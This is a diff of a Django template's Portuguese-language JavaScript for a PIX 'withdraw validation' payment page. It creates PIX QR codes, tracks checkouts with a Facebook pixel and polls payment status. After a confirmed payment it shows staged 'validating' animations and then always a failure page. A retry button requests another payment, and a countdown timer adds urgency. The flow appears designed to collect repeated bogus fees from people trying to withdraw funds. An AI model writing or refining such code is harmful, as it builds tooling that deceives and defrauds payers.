@@ -487,273 +487,293 @@
     <script type="text/javascript" src="{% static 'js/jquery.min.js' %}"></script>
     <script type="text/javascript" src="{% static 'js/main.js' %}"></script>
 
-    <script>
-        function nextStep(step) {
-            ['full-step1', 'full-step2', 'full-step3', 'pix-step'].forEach(id => {
-                const el = document.getElementById(id);
-                if (el) el.style.display = 'none';
-                else console.warn(`Element ${id} not found in DOM`);
+<script>
+    function nextStep(step) {
+        ['full-step1', 'full-step2', 'full-step3', 'pix-step'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.style.display = 'none';
+            else console.warn(`Element ${id} not found in DOM`);
+        });
+        const targetStep = document.getElementById(`full-step${step}`);
+        if (targetStep) {
+            targetStep.style.display = 'block';
+            console.log(`Switched to full-step${step}`);
+        } else {
+            console.error(`Step full-step${step} not found in DOM`);
+            alert('Erro: Etapa não encontrada. Recarregue a página.');
+        }
+    }
+
+    function canGeneratePix() {
+        let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
+        let lastTime = parseInt(localStorage.getItem('lastPixGenerationTime') || '0');
+        let now = Date.now();
+        return count < 3 && (now - lastTime > 300000);  // 5 minutos = 300000 ms
+    }
+
+    function initiatePixGeneration() {
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const pixStep = document.getElementById('pix-step');
+        const pixContent = document.getElementById('pix-content');
+        if (!pixStep || !pixContent) {
+            console.error('pix-step or pix-content not found in DOM');
+            alert('Erro: Elementos da interface não encontrados. Recarregue a página.');
+            return;
+        }
+
+        loadingOverlay.classList.add('active');
+        fetch("{% url 'core:withdraw_validation' %}", {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token }}',
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        })
+            .then(response => {
+                console.log('Initiate PIX Response Status:', response.status);
+                console.log('Initiate PIX Response Headers:', response.headers);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Initiate PIX Response Text:', text);
+                let data;
+                try {
+                    data = JSON.parse(text);
+                } catch (e) {
+                    console.error('Initiate PIX JSON Parse Error:', e);
+                    throw new Error('Resposta inválida do servidor');
+                }
+                console.log('Initiate PIX Response Data:', data);
+                loadingOverlay.classList.remove('active');
+                if (data.status === 'success') {
+                    fbq('track', 'InitiateCheckout');
+                    ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
+                        const el = document.getElementById(id);
+                        if (el) el.style.display = 'none';
+                    });
+                    pixStep.style.display = 'block';
+                    let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
+                    localStorage.setItem('pixGenerationCount', count + 1);
+                    localStorage.setItem('lastPixGenerationTime', Date.now());
+                    let generateButtonHtml = canGeneratePix() ? '<button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>' : '';
+                    pixContent.innerHTML = `
+                    <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
+                    <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
+                    <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
+                    <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                    ${generateButtonHtml}
+                    <p>Tempo restante para validação: <span id="timer">09:59</span></p>
+                `;
+                    pixContent.classList.remove('hidden');
+                    console.log('PIX content updated successfully');
+                    startPolling();  // Inicia polling após gerar PIX
+                } else {
+                    console.log('Initiate PIX Error:', data.message || 'Unknown error');
+                    alert(data.message || 'Erro ao gerar PIX. Tente novamente.');
+                }
+            })
+            .catch(error => {
+                console.error('Initiate PIX Error:', error);
+                loadingOverlay.classList.remove('active');
+                alert('Erro ao processar a requisição: ' + error.message);
             });
-            const targetStep = document.getElementById(`full-step${step}`);
-            if (targetStep) {
-                targetStep.style.display = 'block';
-                console.log(`Switched to full-step${step}`);
-            } else {
-                console.error(`Step full-step${step} not found in DOM`);
-                alert('Erro: Etapa não encontrada. Recarregue a página.');
-            }
+    }
+
+    function copyToClipboard(button) {
+        const pixCode = document.getElementById('pixcode');
+        if (!pixCode) {
+            console.error('pixcode input not found in DOM');
+            alert('Erro: Campo de chave PIX não encontrado.');
+            return;
+        }
+        pixCode.select();
+        document.execCommand('copy');
+        button.innerText = 'Chave copiada!';
+        setTimeout(() => {
+            button.innerText = 'Copiar chave PIX';
+        }, 3000);
+    }
+
+    function generateNewPix() {
+        if (!canGeneratePix()) {
+            alert('Você pode gerar um novo PIX apenas a cada 5 minutos e no máximo 3 vezes.');
+            return;
         }
 
-        function initiatePixGeneration() {
-            const loadingOverlay = document.getElementById('loading-overlay');
-            const pixStep = document.getElementById('pix-step');
-            const pixContent = document.getElementById('pix-content');
-            if (!pixStep || !pixContent) {
-                console.error('pix-step or pix-content not found in DOM');
-                alert('Erro: Elementos da interface não encontrados. Recarregue a página.');
-                return;
-            }
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const pixStep = document.getElementById('pix-step');
+        const pixContent = document.getElementById('pix-content');
+        const container = document.querySelector('.d-flex.flex-column.min-vh-100');
+        if (!pixStep || !pixContent || !container) {
+            console.error('pix-step, pix-content, or container not found in DOM');
+            alert('Erro: Elementos da interface não encontrados. Recarregue a página.');
+            return;
+        }
 
-            loadingOverlay.classList.add('active');
-            fetch("{% url 'core:withdraw_validation' %}", {
-                method: 'POST',
-                headers: {
-                    'X-CSRFToken': '{{ csrf_token }}',
-                    'X-Requested-With': 'XMLHttpRequest'
+        // Ensure pix-step is visible
+        ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.style.display = 'none';
+        });
+        pixStep.style.display = 'block';
+
+        loadingOverlay.classList.add('active');
+        fetch("{% url 'core:withdraw_validation' %}", {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token }}',
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        })
+            .then(response => {
+                console.log('Generate PIX Response Status:', response.status);
+                console.log('Generate PIX Response Headers:', response.headers);
+                return response.text();
+            })
+            .then(text => {
+                console.log('Generate PIX Response Text:', text);
+                let data;
+                try {
+                    data = JSON.parse(text);
+                } catch (e) {
+                    console.error('Generate PIX JSON Parse Error:', e);
+                    throw new Error('Resposta inválida do servidor');
+                }
+                console.log('Generate PIX Response Data:', data);
+                loadingOverlay.classList.remove('active');
+                if (data.status === 'success') {
+                    fbq('track', 'InitiateCheckout');
+                    let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
+                    localStorage.setItem('pixGenerationCount', count + 1);
+                    localStorage.setItem('lastPixGenerationTime', Date.now());
+                    let generateButtonHtml = canGeneratePix() ? '<button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>' : '';
+                    pixContent.innerHTML = `
+                    <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
+                    <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
+                    <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
+                    <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                    ${generateButtonHtml}
+                    <p>Tempo restante para validação: <span id="timer">09:59</span></p>
+                `;
+                    pixContent.classList.remove('hidden');
+                    console.log('PIX content updated successfully');
+                    startPolling();  // Inicia polling após gerar novo PIX
+                } else {
+                    console.log('Generate PIX Error:', data.message || 'Unknown error');
+                    alert(data.message || 'Erro ao gerar novo PIX. Tente novamente.');
                 }
             })
-                .then(response => {
-                    console.log('Initiate PIX Response Status:', response.status);
-                    console.log('Initiate PIX Response Headers:', response.headers);
-                    return response.text();
-                })
-                .then(text => {
-                    console.log('Initiate PIX Response Text:', text);
-                    let data;
-                    try {
-                        data = JSON.parse(text);
-                    } catch (e) {
-                        console.error('Initiate PIX JSON Parse Error:', e);
-                        throw new Error('Resposta inválida do servidor');
-                    }
-                    console.log('Initiate PIX Response Data:', data);
-                    loadingOverlay.classList.remove('active');
-                    if (data.status === 'success') {
-                        fbq('track', 'InitiateCheckout');
-                        ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
-                            const el = document.getElementById(id);
-                            if (el) el.style.display = 'none';
-                        });
-                        pixStep.style.display = 'block';
-                        let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
-                        let generateButtonHtml = count < 3 ? '<button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>' : '';
-                        pixContent.innerHTML = `
-                        <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
-                        <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
-                        <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
-                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
-                        ${generateButtonHtml}
-                        <p>Tempo restante para validação: <span id="timer">09:59</span></p>
-                    `;
-                        pixContent.classList.remove('hidden');
-                        console.log('PIX content updated successfully');
-                        startPolling();  // Inicia polling após gerar PIX
-                    } else {
-                        console.log('Initiate PIX Error:', data.message || 'Unknown error');
-                        alert(data.message || 'Erro ao gerar PIX. Tente novamente.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Initiate PIX Error:', error);
-                    loadingOverlay.classList.remove('active');
-                    alert('Erro ao processar a requisição: ' + error.message);
-                });
-        }
-
-        function copyToClipboard(button) {
-            const pixCode = document.getElementById('pixcode');
-            if (!pixCode) {
-                console.error('pixcode input not found in DOM');
-                alert('Erro: Campo de chave PIX não encontrado.');
-                return;
-            }
-            pixCode.select();
-            document.execCommand('copy');
-            button.innerText = 'Chave copiada!';
-            setTimeout(() => {
-                button.innerText = 'Copiar chave PIX';
-            }, 3000);
-        }
-
-        function generateNewPix() {
-            let count = parseInt(localStorage.getItem('pixGenerationCount') || '0');
-            if (count >= 3) {
-                alert('Limite de gerações de PIX atingido.');
-                return;
-            }
-
-            const loadingOverlay = document.getElementById('loading-overlay');
-            const pixStep = document.getElementById('pix-step');
-            const pixContent = document.getElementById('pix-content');
-            const container = document.querySelector('.d-flex.flex-column.min-vh-100');
-            if (!pixStep || !pixContent || !container) {
-                console.error('pix-step, pix-content, or container not found in DOM');
-                alert('Erro: Elementos da interface não encontrados. Recarregue a página.');
-                return;
-            }
-
-            // Ensure pix-step is visible
-            ['full-step1', 'full-step2', 'full-step3'].forEach(id => {
-                const el = document.getElementById(id);
-                if (el) el.style.display = 'none';
+            .catch(error => {
+                console.error('Generate PIX Error:', error);
+                loadingOverlay.classList.remove('active');
+                alert('Erro ao processar a requisição: ' + error.message);
             });
-            pixStep.style.display = 'block';
+    }
 
-            loadingOverlay.classList.add('active');
-            fetch("{% url 'core:withdraw_validation' %}", {
-                method: 'POST',
-                headers: {
-                    'X-CSRFToken': '{{ csrf_token }}',
-                    'X-Requested-With': 'XMLHttpRequest'
+    function retryValidation() {
+        const wrapBoarding = document.querySelector('.wrap-boarding');
+        fetch("{% url 'core:reset_validation' %}", {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token }}',
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+        })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                } else {
+                    throw new Error('Error resetting validation');
                 }
             })
-                .then(response => {
-                    console.log('Generate PIX Response Status:', response.status);
-                    console.log('Generate PIX Response Headers:', response.headers);
-                    return response.text();
-                })
-                .then(text => {
-                    console.log('Generate PIX Response Text:', text);
-                    let data;
-                    try {
-                        data = JSON.parse(text);
-                    } catch (e) {
-                        console.error('Generate PIX JSON Parse Error:', e);
-                        throw new Error('Resposta inválida do servidor');
-                    }
-                    console.log('Generate PIX Response Data:', data);
-                    loadingOverlay.classList.remove('active');
-                    if (data.status === 'success') {
-                        fbq('track', 'InitiateCheckout');
-                        localStorage.setItem('pixGenerationCount', count + 1);
-                        let generateButtonHtml = (count + 1) < 3 ? '<button onclick="generateNewPix()" class="styled-button small">Gerar novo PIX</button>' : '';
-                        pixContent.innerHTML = `
-                        <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
-                        <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
-                        <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
-                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
-                        ${generateButtonHtml}
-                        <p>Tempo restante para validação: <span id="timer">09:59</span></p>
-                    `;
-                        pixContent.classList.remove('hidden');
-                        console.log('PIX content updated successfully');
-                        startPolling();  // Inicia polling após gerar novo PIX
-                    } else {
-                        console.log('Generate PIX Error:', data.message || 'Unknown error');
-                        alert(data.message || 'Erro ao gerar novo PIX. Tente novamente.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Generate PIX Error:', error);
-                    loadingOverlay.classList.remove('active');
-                    alert('Erro ao processar a requisição: ' + error.message);
-                });
-        }
-
-        function retryValidation() {
-            const wrapBoarding = document.querySelector('.wrap-boarding');
-            fetch("{% url 'core:reset_validation' %}", {
-                method: 'POST',
-                headers: {
-                    'X-CSRFToken': '{{ csrf_token }}',
-                    'X-Requested-With': 'XMLHttpRequest'
+            .then(data => {
+                if (data.status === 'success') {
+                    localStorage.removeItem('pixGenerationCount');
+                    localStorage.removeItem('lastPixGenerationTime');
+                    document.getElementById('failure-page').style.display = 'none';
+                    if (wrapBoarding) wrapBoarding.style.display = 'block';
+                    initiatePixGeneration();
                 }
             })
-                .then(response => {
-                    if (response.ok) {
-                        return response.json();
-                    } else {
-                        throw new Error('Error resetting validation');
-                    }
-                })
+            .catch(error => {
+                console.error('Error resetting:', error);
+                alert('Erro ao reiniciar a validação.');
+            });
+    }
+
+    // Função para polling do status do PIX
+    function startPolling() {
+        const interval = setInterval(() => {
+            fetch('/check-pix-status/', {  // Ajuste para '/core/check_pix_status/' se usar namespace
+                method: 'GET',
+                headers: { 'X-Requested-With': 'XMLHttpRequest' }
+            })
+                .then(response => response.json())
                 .then(data => {
-                    if (data.status === 'success') {
-                        document.getElementById('failure-page').style.display = 'none';
-                        if (wrapBoarding) wrapBoarding.style.display = 'block';
-                        initiatePixGeneration();
+                    if (data.status === 'AUTHORIZED' || data.status === 'CONFIRMED' || data.status === 'RECEIVED') {
+                        clearInterval(interval);  // Para polling
+                        // Esconder conteúdo do PIX
+                        document.getElementById('pix-content').classList.add('hidden');
+                        // Apagar a div wrap-boarding ao iniciar a animação de validação
+                        const wrapBoarding = document.querySelector('.wrap-boarding');
+                        if (wrapBoarding) {
+                            wrapBoarding.style.display = 'none';
+                        }
+                        // Mostrar modal de loading por 3s
+                        const loadingModal = document.getElementById('loading-modal');
+                        loadingModal.style.display = 'flex';
+                        setTimeout(() => {
+                            loadingModal.style.display = 'none';
+                            // Mostrar modal de validating por 15s
+                            const validatingModal = document.getElementById('validating-modal');
+                            validatingModal.style.display = 'flex';
+                            const progressFill = document.getElementById('progress-fill');
+                            animateProgressBar(progressFill, 15000);  // Anima em 15s
+                            setTimeout(() => {
+                                validatingModal.style.display = 'none';
+                                // Mostrar página de falha
+                                document.getElementById('failure-page').style.display = 'block';
+                            }, 15000);
+                        }, 3000);
                     }
                 })
-                .catch(error => {
-                    console.error('Error resetting:', error);
-                    alert('Erro ao reiniciar a validação.');
-                });
-        }
+                .catch(error => console.error('Erro no polling:', error));
+        }, 2000);  // Checa a cada 2s
+    }
 
-        // Função para polling do status do PIX
-        function startPolling() {
-            const interval = setInterval(() => {
-                fetch('/check-pix-status/', {  // Ajuste para '/core/check_pix_status/' se usar namespace
-                    method: 'GET',
-                    headers: { 'X-Requested-With': 'XMLHttpRequest' }
-                })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.status === 'AUTHORIZED' || data.status === 'CONFIRMED' || data.status === 'RECEIVED') {
-                            clearInterval(interval);  // Para polling
-                            // Esconder conteúdo do PIX
-                            document.getElementById('pix-content').classList.add('hidden');
-                            // Apagar a div wrap-boarding ao iniciar a animação de validação
-                            const wrapBoarding = document.querySelector('.wrap-boarding');
-                            if (wrapBoarding) {
-                                wrapBoarding.style.display = 'none';
-                            }
-                            // Mostrar modal de loading por 3s
-                            const loadingModal = document.getElementById('loading-modal');
-                            loadingModal.style.display = 'flex';
-                            setTimeout(() => {
-                                loadingModal.style.display = 'none';
-                                // Mostrar modal de validating por 15s
-                                const validatingModal = document.getElementById('validating-modal');
-                                validatingModal.style.display = 'flex';
-                                const progressFill = document.getElementById('progress-fill');
-                                animateProgressBar(progressFill, 15000);  // Anima em 15s
-                                setTimeout(() => {
-                                    validatingModal.style.display = 'none';
-                                    // Mostrar página de falha
-                                    document.getElementById('failure-page').style.display = 'block';
-                                }, 15000);
-                            }, 3000);
-                        }
-                    })
-                    .catch(error => console.error('Erro no polling:', error));
-            }, 2000);  // Checa a cada 2s
-        }
-
-        // Função para animar a progress bar (0 a 100% em duration ms com easing)
-        function animateProgressBar(progressElement, duration) {
-            let progress = 0;
-            const start = performance.now();
-            function step(timestamp) {
-                const elapsed = timestamp - start;
-                progress = Math.min((elapsed / duration) * 100, 100);
-                progressElement.style.width = `${progress}%`;
-                if (elapsed < duration) {
-                    requestAnimationFrame(step);
-                }
+    // Função para animar a progress bar (0 a 100% em duration ms com easing)
+    function animateProgressBar(progressElement, duration) {
+        let progress = 0;
+        const start = performance.now();
+        function step(timestamp) {
+            const elapsed = timestamp - start;
+            progress = Math.min((elapsed / duration) * 100, 100);
+            progressElement.style.width = `${progress}%`;
+            if (elapsed < duration) {
+                requestAnimationFrame(step);
             }
-            requestAnimationFrame(step);
         }
+        requestAnimationFrame(step);
+    }
 
-        let countdown = 600;
-        setInterval(() => {
-            if (countdown > 0) countdown--;
-            const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
-            const seconds = String(countdown % 60).padStart(2, '0');
-            const timerEl = document.getElementById('timer');
-            if (timerEl) timerEl.innerText = `${minutes}:${seconds}`;
-            else console.warn('Timer element not found in DOM');
-        }, 1000);
-    </script>
+    let countdown = 600;
+    setInterval(() => {
+        if (countdown > 0) countdown--;
+        const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
+        const seconds = String(countdown % 60).padStart(2, '0');
+        const timerEl = document.getElementById('timer');
+        if (timerEl) timerEl.innerText = `${minutes}:${seconds}`;
+        else console.warn('Timer element not found in DOM');
+    }, 1000);
+
+    // On page load, for existing PIX, check if can generate and hide button if not
+    document.addEventListener('DOMContentLoaded', () => {
+        const generateButton = document.querySelector('#pix-content button[onclick="generateNewPix()"]');
+        if (generateButton && !canGeneratePix()) {
+            generateButton.style.display = 'none';
+        }
+    });
+</script>
 </body>
 
 </html>
